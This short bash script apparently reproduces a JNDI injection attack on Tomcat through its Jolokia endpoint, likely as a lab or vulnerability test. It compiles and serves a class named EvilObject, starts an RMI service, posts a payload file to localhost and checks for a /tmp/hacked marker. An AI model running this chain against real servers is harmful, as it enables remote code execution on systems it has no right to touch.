#!/bin/bash

set -x
cd /jndi-injection
javac *.java

cp EvilObject.class /tomcat/webapps/ROOT/
java -cp . RMIService &

sleep 3
rm -f /tmp/hacked
curl 127.0.0.1/jolokia/ --data @data.json

ls -lh /tmp
tail -1 /tomcat/logs/catalina.out

kill %%